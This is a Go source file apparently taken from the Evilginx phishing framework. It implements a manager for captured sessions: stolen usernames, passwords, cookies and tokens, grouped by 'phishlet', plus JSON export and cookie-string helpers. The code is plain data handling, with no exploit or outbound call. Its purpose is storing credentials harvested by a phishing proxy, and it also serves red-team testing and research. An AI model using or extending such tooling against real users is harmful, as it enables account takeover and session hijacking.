package evilginx

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"
)

// Session represents a captured session with cookies and tokens
type Session struct {
	ID           string            `json:"id"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	Cookies      map[string]string `json:"cookies"`
	Tokens       map[string]string `json:"tokens"`
	CapturedAt   time.Time         `json:"captured_at"`
	IPAddress    string            `json:"ip_address"`
	UserAgent    string            `json:"user_agent"`
	PhishletName string            `json:"phishlet_name"`
	Valid        bool              `json:"valid"`
}

// SessionManager manages captured sessions
type SessionManager struct {
	sessions map[string]*Session
	mu       sync.RWMutex
}

// NewSessionManager creates a new session manager
func NewSessionManager() *SessionManager {
	return &SessionManager{
		sessions: make(map[string]*Session),
	}
}

// AddSession adds a new captured session
func (sm *SessionManager) AddSession(session *Session) {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if session.ID == "" {
		session.ID = GenRandomAlphanumString(16)
	}

	session.CapturedAt = time.Now()
	sm.sessions[session.ID] = session
}

// GetSession retrieves a session by ID
func (sm *SessionManager) GetSession(id string) (*Session, error) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	session, exists := sm.sessions[id]
	if !exists {
		return nil, fmt.Errorf("session not found: %s", id)
	}

	return session, nil
}

// GetAllSessions returns all captured sessions
func (sm *SessionManager) GetAllSessions() []*Session {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	sessions := make([]*Session, 0, len(sm.sessions))
	for _, session := range sm.sessions {
		sessions = append(sessions, session)
	}

	return sessions
}

// GetSessionsByPhishlet returns sessions for a specific phishlet
func (sm *SessionManager) GetSessionsByPhishlet(phishletName string) []*Session {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	sessions := make([]*Session, 0)
	for _, session := range sm.sessions {
		if session.PhishletName == phishletName {
			sessions = append(sessions, session)
		}
	}

	return sessions
}

// DeleteSession removes a session
func (sm *SessionManager) DeleteSession(id string) error {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if _, exists := sm.sessions[id]; !exists {
		return fmt.Errorf("session not found: %s", id)
	}

	delete(sm.sessions, id)
	return nil
}

// InvalidateSession marks a session as invalid
func (sm *SessionManager) InvalidateSession(id string) error {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	session, exists := sm.sessions[id]
	if !exists {
		return fmt.Errorf("session not found: %s", id)
	}

	session.Valid = false
	return nil
}

// ExportSession exports a session as JSON
func (sm *SessionManager) ExportSession(id string) (string, error) {
	session, err := sm.GetSession(id)
	if err != nil {
		return "", err
	}

	jsonData, err := json.MarshalIndent(session, "", "  ")
	if err != nil {
		return "", err
	}

	return string(jsonData), nil
}

// ParseCookieString parses a cookie string into a map
func ParseCookieString(cookieStr string) map[string]string {
	cookies := make(map[string]string)

	// Simple cookie parsing - split by semicolon
	pairs := strings.Split(cookieStr, ";")
	for _, pair := range pairs {
		parts := strings.SplitN(strings.TrimSpace(pair), "=", 2)
		if len(parts) == 2 {
			cookies[parts[0]] = parts[1]
		}
	}

	return cookies
}

// BuildCookieString builds a cookie string from a map
func BuildCookieString(cookies map[string]string) string {
	var parts []string

	for name, value := range cookies {
		parts = append(parts, fmt.Sprintf("%s=%s", name, value))
	}

	return strings.Join(parts, "; ")
}
